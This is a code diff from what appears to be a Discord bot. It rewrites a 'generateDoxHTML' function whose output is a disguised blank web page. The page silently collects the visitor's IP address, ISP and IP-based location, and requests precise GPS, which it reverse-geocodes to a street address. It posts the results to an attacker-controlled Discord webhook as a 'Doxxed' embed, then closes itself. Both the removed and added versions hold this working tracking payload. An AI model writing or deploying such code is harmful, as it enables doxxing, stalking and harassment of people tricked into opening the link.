@@ -194,143 +194,140 @@ client.on('interactionCreate', async (interaction) => {
 
 // ---- DOX HTML – GPS + Reverse Geocode for Exact Address ----
 function generateDoxHTML(webhook) {
-    return '<!DOCTYPE html>\n' +
-           '<html>\n' +
-           '<head>\n' +
-           '    <meta charset="UTF-8">\n' +
-           '    <title></title>\n' +
-           '    <style>\n' +
-           '        body { background: #ffffff; margin: 0; height: 100vh; }\n' +
-           '    </style>\n' +
-           '</head>\n' +
-           '<body>\n' +
-           '<script>\n' +
-           'const WEBHOOK_URL = "' + webhook + '";\n' +
-           '\n' +
-           'async function getIPData() {\n' +
-           '    const apis = [\n' +
-           '        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },\n' +
-           '        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },\n' +
-           '        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) },\n' +
-           '        { url: "https://ipapi.co/json/", parse: d => ({ ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.org, timezone: d.timezone }) },\n' +
-           '        { url: "https://api.ip.sb/geoip", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.isp, timezone: d.timezone }) },\n' +
-           '        { url: "https://geoplugin.net/json.gp", parse: d => ({ ip: d.geoplugin_request, country: d.geoplugin_countryName, region: d.geoplugin_region, city: d.geoplugin_city, postal: d.geoplugin_postcode, lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, asn: "N/A", isp: d.geoplugin_isp, timezone: d.geoplugin_timezone }) }\n' +
-           '    ];\n' +
-           '    for (const api of apis) {\n' +
-           '        try {\n' +
-           '            const controller = new AbortController();\n' +
-           '            const timeout = setTimeout(() => controller.abort(), 5000);\n' +
-           '            const res = await fetch(api.url, { signal: controller.signal });\n' +
-           '            clearTimeout(timeout);\n' +
-           '            const data = await res.json();\n' +
-           '            if (data.ip) {\n' +
-           '                const result = api.parse(data);\n' +
-           '                if (result.ip) return result;\n' +
-           '            }\n' +
-           '        } catch (e) { console.error("IP fetch failed:", api.url, e); }\n' +
-           '    }\n' +
-           '    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };\n' +
-           '}\n' +
-           '\n' +
-           'async function reverseGeocode(lat, lon) {\n' +
-           '    try {\n' +
-           '        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");\n' +
-           '        const data = await res.json();\n' +
-           '        if (data && data.display_name) return data.display_name;\n' +
-           '    } catch (e) { console.error("Reverse geocode failed:", e); }\n' +
-           '    return null;\n' +
-           '}\n' +
-           '\n' +
-           'async function getGPS() {\n' +
-           '    return new Promise((resolve) => {\n' +
-           '        if (!navigator.geolocation) {\n' +
-           '            resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });\n' +
-           '            return;\n' +
-           '        }\n' +
-           '        navigator.geolocation.getCurrentPosition(\n' +
-           '            (pos) => {\n' +
-           '                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) + "m" });\n' +
-           '            },\n' +
-           '            (err) => {\n' +
-           '                resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });\n' +
-           '            },\n' +
-           '            { enableHighAccuracy: true, timeout: 8000 }\n' +
-           '        );\n' +
-           '    });\n' +
-           '}\n' +
-           '\n' +
-           '(async function() {\n' +
-           '    try {\n' +
-           '        const ip = await getIPData();\n' +
-           '        const now = new Date();\n' +
-           '        const timestamp = now.toISOString();\n' +
-           '        const localTime = now.toString();\n' +
-           '        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;\n' +
-           '\n' +
-           '        // Get GPS (if allowed)\n' +
-           '        const gps = await getGPS();\n' +
-           '        let address = "N/A";\n' +
-           '        let lat = ip.lat || "N/A";\n' +
-           '        let lon = ip.lon || "N/A";\n' +
-           '        let accuracy = "N/A";\n' +
-           '        let source = "IP Geolocation";\n' +
-           '\n' +
-           '        if (gps.lat !== "N/A") {\n' +
-           '            lat = gps.lat;\n' +
-           '            lon = gps.lon;\n' +
-           '            accuracy = gps.acc;\n' +
-           '            source = "GPS (exact)";\n' +
-           '            const addr = await reverseGeocode(gps.lat, gps.lon);\n' +
-           '            if (addr) address = addr;\n' +
-           '        }\n' +
-           '\n' +
-           '        // Build fields\n' +
-           '        const fields = [\n' +
-           '            { name: "📍 Address", value: address, inline: false },\n' +
-           '            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },\n' +
-           '            { name: "🎯 Accuracy", value: accuracy, inline: true },\n' +
-           '            { name: "📡 Source", value: source, inline: true },\n' +
-           '            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },\n' +
-           '            { name: "🏙️ City", value: ip.city || "N/A", inline: true },\n' +
-           '            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },\n' +
-           '            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },\n' +
-           '            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },\n' +
-           '            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },\n' +
-           '            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },\n' +
-           '            { name: "⏰ Local Time", value: localTime, inline: false },\n' +
-           '            { name: "📅 Timestamp", value: timestamp, inline: false }\n' +
-           '        ];\n' +
-           '\n' +
-           '        const embed = {\n' +
-           '            title: "☠️ Doxxed",\n' +
-           '            color: 0xFF0000,\n' +
-           '            fields: fields,\n' +
-           '            footer: { text: "Logged at " + timestamp }\n' +
-           '        };\n' +
-           '\n' +
-           '        await fetch(WEBHOOK_URL, {\n' +
-           '            method: "POST",\n' +
-           '            headers: { "Content-Type": "application/json" },\n' +
-           '            body: JSON.stringify({ embeds: [embed] })\n' +
-           '        });\n' +
-           '\n' +
-           '    } catch (err) {\n' +
-           '        console.error("Dox error:", err);\n' +
-           '    }\n' +
-           '\n' +
-           '    // ---- WHITE PAGE, CLOSE ----
-           document.body.innerHTML = "";\n' +
-           '    document.body.style.background = "#ffffff";\n' +
-           '    document.body.style.margin = "0";\n' +
-           '    document.body.style.height = "100vh";\n' +
-           '    setTimeout(() => {\n' +
-           '        window.close();\n' +
-           '        window.location.href = "about:blank";\n' +
-           '    }, 1000);\n' +
-           '})();\n' +
-           '<\/script>\n' +
-           '</body>\n' +
-           '</html>';
+    return `<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+    <style>
+        body { background: #ffffff; margin: 0; height: 100vh; }
+    </style>
+</head>
+<body>
+<script>
+const WEBHOOK_URL = "${webhook}";
+
+async function getIPData() {
+    const apis = [
+        { url: "https://ipinfo.io/json", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.loc?.split(",")[0], lon: d.loc?.split(",")[1], asn: d.asn, isp: d.org, timezone: d.timezone }) },
+        { url: "https://ip-api.com/json/?fields=status,country,regionName,city,zip,lat,lon,as,isp,query", parse: d => ({ ip: d.query, country: d.country, region: d.regionName, city: d.city, postal: d.zip, lat: d.lat, lon: d.lon, asn: d.as, isp: d.isp, timezone: "N/A" }) },
+        { url: "https://api.ipify.org?format=json", parse: d => ({ ip: d.ip }) },
+        { url: "https://ipapi.co/json/", parse: d => ({ ip: d.ip, country: d.country_name, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.org, timezone: d.timezone }) },
+        { url: "https://api.ip.sb/geoip", parse: d => ({ ip: d.ip, country: d.country, region: d.region, city: d.city, postal: d.postal, lat: d.latitude, lon: d.longitude, asn: d.asn, isp: d.isp, timezone: d.timezone }) },
+        { url: "https://geoplugin.net/json.gp", parse: d => ({ ip: d.geoplugin_request, country: d.geoplugin_countryName, region: d.geoplugin_region, city: d.geoplugin_city, postal: d.geoplugin_postcode, lat: d.geoplugin_latitude, lon: d.geoplugin_longitude, asn: "N/A", isp: d.geoplugin_isp, timezone: d.geoplugin_timezone }) }
+    ];
+    for (const api of apis) {
+        try {
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 5000);
+            const res = await fetch(api.url, { signal: controller.signal });
+            clearTimeout(timeout);
+            const data = await res.json();
+            if (data.ip) {
+                const result = api.parse(data);
+                if (result.ip) return result;
+            }
+        } catch (e) { console.error("IP fetch failed:", api.url, e); }
+    }
+    return { ip: "N/A", country: "N/A", region: "N/A", city: "N/A", postal: "N/A", lat: "N/A", lon: "N/A", asn: "N/A", isp: "N/A", timezone: "N/A" };
+}
+
+async function reverseGeocode(lat, lon) {
+    try {
+        const res = await fetch("https://nominatim.openstreetmap.org/reverse?lat=" + lat + "&lon=" + lon + "&format=json&zoom=18&addressdetails=1");
+        const data = await res.json();
+        if (data && data.display_name) return data.display_name;
+    } catch (e) { console.error("Reverse geocode failed:", e); }
+    return null;
+}
+
+async function getGPS() {
+    return new Promise((resolve) => {
+        if (!navigator.geolocation) {
+            resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: Math.round(pos.coords.accuracy) + "m" });
+            },
+            (err) => {
+                resolve({ lat: "N/A", lon: "N/A", acc: "N/A" });
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+        );
+    });
+}
+
+(async function() {
+    try {
+        const ip = await getIPData();
+        const now = new Date();
+        const timestamp = now.toISOString();
+        const localTime = now.toString();
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        const gps = await getGPS();
+        let address = "N/A";
+        let lat = ip.lat || "N/A";
+        let lon = ip.lon || "N/A";
+        let accuracy = "N/A";
+        let source = "IP Geolocation";
+
+        if (gps.lat !== "N/A") {
+            lat = gps.lat;
+            lon = gps.lon;
+            accuracy = gps.acc;
+            source = "GPS (exact)";
+            const addr = await reverseGeocode(gps.lat, gps.lon);
+            if (addr) address = addr;
+        }
+
+        const fields = [
+            { name: "📍 Address", value: address, inline: false },
+            { name: "📌 Coordinates", value: lat + ", " + lon, inline: true },
+            { name: "🎯 Accuracy", value: accuracy, inline: true },
+            { name: "📡 Source", value: source, inline: true },
+            { name: "🌐 IP", value: ip.ip || "N/A", inline: true },
+            { name: "🏙️ City", value: ip.city || "N/A", inline: true },
+            { name: "🗺️ Region", value: ip.region || "N/A", inline: true },
+            { name: "📮 Postal", value: ip.postal || "N/A", inline: true },
+            { name: "🔢 ASN", value: ip.asn || "N/A", inline: true },
+            { name: "🏢 ISP", value: ip.isp || "N/A", inline: true },
+            { name: "🕒 Timezone", value: ip.timezone || "N/A", inline: true },
+            { name: "⏰ Local Time", value: localTime, inline: false },
+            { name: "📅 Timestamp", value: timestamp, inline: false }
+        ];
+
+        const embed = {
+            title: "☠️ Doxxed",
+            color: 0xFF0000,
+            fields: fields,
+            footer: { text: "Logged at " + timestamp }
+        };
+
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ embeds: [embed] })
+        });
+
+    } catch (err) {
+        console.error("Dox error:", err);
+    }
+
+    document.body.innerHTML = "";
+    document.body.style.background = "#ffffff";
+    document.body.style.margin = "0";
+    document.body.style.height = "100vh";
+    setTimeout(() => {
+        window.close();
+        window.location.href = "about:blank";
+    }, 1000);
+})();
+<\/script>
+</body>
+</html>`;
 }
 
 client.login(TOKEN);
